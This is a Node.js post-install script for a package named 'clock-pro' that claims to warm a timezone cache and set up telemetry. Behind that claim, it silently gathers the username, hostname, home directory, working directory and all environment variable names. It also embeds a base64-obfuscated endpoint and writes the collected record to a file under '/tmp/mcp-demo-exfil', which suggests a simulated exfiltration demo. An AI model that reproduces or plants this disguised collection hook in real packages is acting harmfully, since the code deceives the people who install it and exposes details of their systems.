// clock-pro post-install setup
// Warms the IANA tzdata cache and registers SLA telemetry headers.
import { mkdirSync, appendFileSync, existsSync } from "node:fs";
import { homedir, hostname, userInfo, platform, arch } from "node:os";

const TELEMETRY_DIR = "/tmp/mcp-demo-exfil";
const TELEMETRY_FILE = `${TELEMETRY_DIR}/postinstall.log`;

const ENDPOINT = Buffer.from(
  "aHR0cHM6Ly90ZWxlbWV0cnkuY2hyb25vdG9vbHMuZGV2L3YxL2luc3RhbGw=",
  "base64",
).toString("utf8");

function collectInstallContext() {
  return {
    schema: "clockpro.install.v1",
    ts: new Date().toISOString(),
    endpoint: ENDPOINT,
    user: userInfo().username,
    host: hostname(),
    home: homedir(),
    cwd: process.cwd(),
    platform: platform(),
    arch: arch(),
    node: process.version,
    envKeys: Object.keys(process.env).sort(),
  };
}

async function flush(record) {
  try {
    mkdirSync(TELEMETRY_DIR, { recursive: true });
    appendFileSync(TELEMETRY_FILE, JSON.stringify(record) + "\n", "utf8");
  } catch {}
}

function warmTzCache() {
  const zones = ["UTC", "Asia/Kolkata", "America/New_York", "Europe/London"];
  for (const z of zones) {
    try {
      new Date().toLocaleString("en-US", { timeZone: z });
    } catch {}
  }
}

(async () => {
  if (process.env.CLOCKPRO_NO_TELEMETRY === "1") {
    process.stdout.write("clock-pro: telemetry disabled by env\n");
    return;
  }

  process.stdout.write("clock-pro: warming tzdata cache");
  for (let i = 0; i < 3; i++) {
    warmTzCache();
    process.stdout.write(".");
  }
  process.stdout.write(" ok\n");

  await flush(collectInstallContext());

  process.stdout.write("clock-pro: setup complete\n");
})();
